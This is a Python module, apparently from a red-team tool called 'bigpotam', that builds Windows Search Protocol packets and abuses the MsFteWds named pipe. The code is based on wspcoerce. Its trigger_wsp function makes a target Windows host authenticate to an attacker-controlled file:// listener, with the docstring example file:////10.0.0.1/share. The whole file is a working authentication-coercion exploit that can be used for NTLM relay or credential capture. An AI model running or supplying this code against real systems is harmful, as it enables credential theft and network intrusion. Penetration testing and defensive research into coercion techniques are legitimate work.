"""MS-WSP (Windows Search Protocol) packet building and coercion.

Based on wspcoerce by RedTeam Pentesting GmbH.
WSP uses a binary protocol over the MsFteWds named pipe, not DCE/RPC.
"""

import logging
import struct
import uuid
from dataclasses import dataclass, field
from enum import IntEnum
from typing import Any, List

from impacket.smb3 import (
    FILE_READ_DATA,
    FILE_SHARE_READ,
    FSCTL_PIPE_TRANSCEIVE,
    SMB2_0_IOCTL_IS_FSCTL,
)

log = logging.getLogger("bigpotam")

# =============================================================================
# Constants
# =============================================================================

WSP_DEFAULT_LCID = 0x00000409
XOR_CONST = 0x59533959
NULL_UUID = uuid.UUID("00000000-0000-0000-0000-000000000000")
DBPROPSET_FSCIFRMWRK_EXT = uuid.UUID("A9BD1526-6A80-11D0-8C9D-0020AF1D740E")
DBPROP_CI_CATALOG_NAME = 0x00000002
PRSPEC_PROPID = 0x00000001
RTPROPERTY = 0x00000005
PREQ = 0x00000004


class WspMessageType(IntEnum):
    CPMCONNECT = 0x000000C8
    CPMDISCONNECT = 0x000000C9
    CPMCREATEQUERY = 0x000000CA


# =============================================================================
# Helpers
# =============================================================================

def _align_write(buf, alignment):
    while len(buf) % alignment != 0:
        buf.extend(b"\x00")


def _add_align(buf, data, alignment):
    _align_write(buf, alignment)
    buf.extend(data)


def _checksum(buffer, msg_type):
    total = sum(
        int.from_bytes(buffer[i:i + 4], "little")
        for i in range(0, len(buffer), 4)
    )
    total ^= XOR_CONST
    total -= msg_type
    return total & 0xFFFFFFFF


# =============================================================================
# Packet structures
# =============================================================================

@dataclass
class WspMessageHeader:
    _msg: int
    _status: int = 0
    _ulChecksum: int = 0
    _ulReserved2: int = 0

    def to_bytes(self):
        return struct.pack("<IIII", self._msg, self._status,
                           self._ulChecksum, self._ulReserved2)


@dataclass
class VT_BSTR:
    _string: str

    def to_bytes(self, buf):
        s = (self._string + "\0").encode("utf-16le")
        buf.extend(struct.pack("<I", len(s)))
        buf.extend(s)


@dataclass
class CBaseStorageVariant:
    vType: int
    vValue: Any
    vData1: int = 0
    vData2: int = 0

    def to_bytes(self, buf):
        buf.extend(struct.pack("<H", self.vType))
        buf.extend(struct.pack("<B", self.vData1))
        buf.extend(struct.pack("<B", self.vData2))
        self.vValue.to_bytes(buf)


@dataclass
class CProp:
    DBPROPID: int
    vValue: CBaseStorageVariant
    DBPROPOPTIONS: int = 0
    DBPROPSTATUS: int = 0

    def to_bytes(self, buf):
        buf.extend(struct.pack("<I", self.DBPROPID))
        buf.extend(struct.pack("<I", self.DBPROPOPTIONS))
        buf.extend(struct.pack("<I", self.DBPROPSTATUS))
        # CDbColId (DBKIND_GUID_PROPID, NULL_UUID, 0)
        buf.extend(struct.pack("<I", 0x00000001))  # eKind
        _add_align(buf, NULL_UUID.bytes_le, 8)
        buf.extend(struct.pack("<I", 0))  # ulId
        self.vValue.to_bytes(buf)


@dataclass
class CPropSet:
    guidPropertySet: uuid.UUID
    aProps: List[CProp] = field(default_factory=list)

    def to_bytes(self, buf):
        buf.extend(self.guidPropertySet.bytes_le)
        _add_align(buf, struct.pack("<I", len(self.aProps)), 4)
        for prop in self.aProps:
            _align_write(buf, 4)
            prop.to_bytes(buf)


@dataclass
class CPMConnectIn:
    MachineName: str
    UserName: str
    _iClientVersion: int = 0x00010700
    _fClientIsRemote: int = 0x00000001

    def to_bytes(self):
        header = WspMessageHeader(_msg=WspMessageType.CPMCONNECT)
        body = self._body()
        header._ulChecksum = _checksum(body, WspMessageType.CPMCONNECT)
        return header.to_bytes() + body

    def _body(self):
        buf = bytearray()
        buf.extend(struct.pack("<I", self._iClientVersion))
        buf.extend(struct.pack("<I", self._fClientIsRemote))

        blob1 = bytearray()
        blob1.extend(struct.pack("<I", 0))
        buf.extend(struct.pack("<I", len(blob1)))

        blob2 = bytearray()
        _add_align(blob2, struct.pack("<I", 1), 8)
        CPropSet(
            DBPROPSET_FSCIFRMWRK_EXT,
            [CProp(
                DBPROPID=DBPROP_CI_CATALOG_NAME,
                vValue=CBaseStorageVariant(vType=0x0008, vValue=VT_BSTR("Windows\\SYSTEMINDEX")),
            )],
        ).to_bytes(blob2)

        _add_align(buf, struct.pack("<I", len(blob2)), 8)
        buf.extend(bytes(12))
        buf.extend((self.MachineName + "\0").encode("utf-16le"))
        buf.extend((self.UserName + "\0").encode("utf-16le"))
        _align_write(buf, 8)
        buf.extend(blob1)
        _align_write(buf, 8)
        buf.extend(blob2)
        buf.extend(bytes(4))
        return bytes(buf)


@dataclass
class CPMCreateQueryIn:
    target_uri: str

    def to_bytes(self):
        header = WspMessageHeader(_msg=WspMessageType.CPMCREATEQUERY)
        body = self._body()
        header._ulChecksum = _checksum(body, WspMessageType.CPMCREATEQUERY)
        return header.to_bytes() + body

    def _body(self):
        buf = bytearray()
        buf.extend(struct.pack("<I", 0))  # size placeholder

        buf.append(0x01)  # CColumnSetPresent
        _align_write(buf, 4)
        buf.extend(struct.pack("<I", 0))  # empty CColumnSet

        buf.append(0x01)  # CRestrictionPresent

        # CRestrictionArray
        buf.extend(struct.pack("<B", 1))  # count
        buf.extend(struct.pack("<B", 1))  # isValid
        _align_write(buf, 4)

        # CRestriction (RTPROPERTY)
        buf.extend(struct.pack("<I", RTPROPERTY))
        buf.extend(struct.pack("<I", 1000))  # weight

        # CPropertyRestriction
        buf.extend(struct.pack("<I", PREQ))  # relop
        # PropSpec
        prop_guid = uuid.UUID("b725f130-47ef-101a-a5f1-02608c9eebac")
        _add_align(buf, prop_guid.bytes_le, 8)
        buf.extend(struct.pack("<II", PRSPEC_PROPID, 0x16))
        # prval (VT_LPWSTR)
        _align_write(buf, 4)
        buf.extend(struct.pack("<I", 0x1F))  # VT_LPWSTR
        s = (self.target_uri + "\0").encode("utf-16le")
        buf.extend(struct.pack("<I", len(s) // 2))
        buf.extend(s)
        # lcid
        _add_align(buf, struct.pack("<I", WSP_DEFAULT_LCID), 4)

        buf.append(0x00)  # CSortSetPresent
        buf.append(0x00)  # CCategorizationSetPresent
        _align_write(buf, 4)

        # CRowsetProperties
        buf.extend(struct.pack("<IIIII", 0x00000001, 0, 0, 10, 30))

        # CPidMapper
        buf.extend(struct.pack("<I", 1))  # count
        _add_align(buf, NULL_UUID.bytes_le, 8)
        buf.extend(struct.pack("<II", PRSPEC_PROPID, 0x16))

        # CColumnGroupArray
        buf.extend(struct.pack("<I", 0))

        buf.extend(struct.pack("<I", WSP_DEFAULT_LCID))

        # patch size
        buf[0:4] = struct.pack("<I", len(buf))
        return bytes(buf)


@dataclass
class CPMDisconnect:
    def to_bytes(self):
        header = WspMessageHeader(_msg=WspMessageType.CPMDISCONNECT)
        header._ulChecksum = _checksum(b"", WspMessageType.CPMDISCONNECT)
        return header.to_bytes()


# =============================================================================
# WSP coercion trigger
# =============================================================================

def trigger_wsp(smb_client, listener, username="bigpotam"):
    """Execute WSP Connect/Query/Disconnect to coerce authentication.

    Args:
        smb_client: An authenticated impacket SMBConnection
        listener: file:// URI for the listener (e.g. file:////10.0.0.1/share)
        username: Username for WSP connect message

    Returns:
        True on success, False on failure
    """
    try:
        tree_id = smb_client.connectTree("IPC$")
    except Exception as e:
        log.debug("WSP: failed to connect to IPC$: %s", e)
        return False

    try:
        file_id = smb_client.createFile(
            tree_id, "MsFteWds", FILE_READ_DATA, FILE_SHARE_READ,
        )
    except Exception as e:
        err = str(e)
        if "STATUS_OBJECT_NAME_NOT_FOUND" in err:
            log.debug("WSP: MsFteWds pipe not available (Windows Search not running)")
        else:
            log.debug("WSP: failed to open MsFteWds: %s", e)
        return False

    try:
        smb_client._SMBConnection.ioctl(
            tree_id, file_id, FSCTL_PIPE_TRANSCEIVE, SMB2_0_IOCTL_IS_FSCTL,
            CPMConnectIn("bigpotam", username).to_bytes(), 0, 40,
        )
        log.debug("WSP: Connect sent")

        smb_client._SMBConnection.ioctl(
            tree_id, file_id, FSCTL_PIPE_TRANSCEIVE, SMB2_0_IOCTL_IS_FSCTL,
            CPMCreateQueryIn(listener).to_bytes(), 0, 40,
        )
        log.debug("WSP: Query sent")

        smb_client._SMBConnection.ioctl(
            tree_id, file_id, FSCTL_PIPE_TRANSCEIVE, SMB2_0_IOCTL_IS_FSCTL,
            CPMDisconnect().to_bytes(), 0, 40,
        )
        log.debug("WSP: Disconnect sent")

        smb_client.closeFile(tree_id, file_id)
        smb_client.disconnectTree(tree_id)
        return True

    except Exception as e:
        err = str(e)
        if "STATUS_PIPE_DISCONNECTED" in err or "STATUS_CONNECTION_DISCONNECTED" in err:
            return True
        log.debug("WSP: trigger error: %s", e)
        return False
